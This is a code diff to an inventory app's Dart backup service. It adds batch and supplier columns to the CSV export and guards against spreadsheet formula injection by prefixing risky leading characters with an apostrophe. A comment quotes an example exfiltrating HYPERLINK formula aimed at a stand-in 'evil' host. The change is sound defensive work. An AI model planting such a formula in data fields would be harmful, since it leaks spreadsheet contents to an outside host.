@@ -383,21 +383,48 @@ class BackupService {
           p.stockQty, p.createdAt.toIso8601String(), p.updatedAt.toIso8601String(),
         ],
     ];
-    return const ListToCsvConverter().convert(rows);
+    return _toCsv(rows);
   }
 
   /// Export movements to CSV — full history with every column.
+  ///
+  /// "Export stops at Buy Rate" is one of the competitor complaints this app
+  /// was built to answer, so every column means every column: `batchId` and
+  /// `supplierId` were previously dropped.
   Future<String> exportMovementsCsv() async {
     final movements = await _db.movementDao.getAllForExport();
     final rows = <List<dynamic>>[
-      ['ID', 'Product ID', 'Qty Delta', 'Reason', 'Note', 'Audit Session ID', 'Created At'],
+      [
+        'ID', 'Product ID', 'Qty Delta', 'Reason', 'Note',
+        'Batch ID', 'Supplier ID', 'Audit Session ID', 'Created At',
+      ],
       for (final m in movements)
         [
-          m.id, m.productId, m.qtyDelta, m.reason,
-          m.note ?? '', m.auditSessionId ?? '', m.createdAt.toIso8601String(),
+          m.id, m.productId, m.qtyDelta, m.reason, m.note ?? '',
+          m.batchId ?? '', m.supplierId ?? '', m.auditSessionId ?? '',
+          m.createdAt.toIso8601String(),
         ],
     ];
-    return const ListToCsvConverter().convert(rows);
+    return _toCsv(rows);
+  }
+
+  /// Converts rows to CSV with spreadsheet formulas neutralised.
+  ///
+  /// A cell beginning `=`, `+`, `-`, `@`, tab or carriage return is executed
+  /// as a formula by Excel and Google Sheets. Product names are user- and
+  /// supplier-controlled — a name like `=HYPERLINK("http://evil/"&A1,"x")`
+  /// would run when the shopkeeper opens their own export. Prefixing with an
+  /// apostrophe makes the cell text; spreadsheets hide the apostrophe.
+  static String _toCsv(List<List<dynamic>> rows) {
+    return const ListToCsvConverter().convert([
+      for (final row in rows) [for (final cell in row) _neutralise(cell)],
+    ]);
+  }
+
+  static Object? _neutralise(Object? cell) {
+    if (cell is! String || cell.isEmpty) return cell;
+    const dangerous = {'=', '+', '-', '@', '\t', '\r'};
+    return dangerous.contains(cell[0]) ? "'$cell" : cell;
   }
 
   /// Export an audit session reconciliation report to CSV.
@@ -427,7 +454,7 @@ class BackupService {
       ]);
     }
 
-    return const ListToCsvConverter().convert(rows);
+    return _toCsv(rows);
   }
 
   /// Write CSV exports to temp directory and return file paths.
